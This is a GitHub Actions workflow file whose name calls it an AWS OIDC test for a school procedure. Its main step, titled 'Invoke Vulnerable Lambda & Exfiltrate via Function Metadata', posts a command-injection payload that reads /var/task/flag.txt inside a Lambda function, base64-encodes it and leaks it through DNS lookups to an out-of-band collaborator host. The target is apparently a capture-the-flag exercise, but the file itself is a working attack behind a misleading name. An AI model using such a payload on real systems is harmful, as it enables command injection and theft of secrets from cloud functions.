name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="gehqptlfvfkfakfpbqdzb6kmjoqjcnjzs.oast.fun"
          
          # Replace YOUR_SUBDOMAIN with your DNS collaborator host (e.g., xxx.oastify.com or xxx.interact.sh)
          COLLABORATOR="gehqptlfvfkfakfpbqdzb6kmjoqjcnjzs.oast.fun"
          
          PAYLOAD="{\"domain\": \"127.0.0.1; FLAG=\$(cat /var/task/flag.txt | base64 | tr -d '\n'); dig \$FLAG.$COLLABORATOR\"}"
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
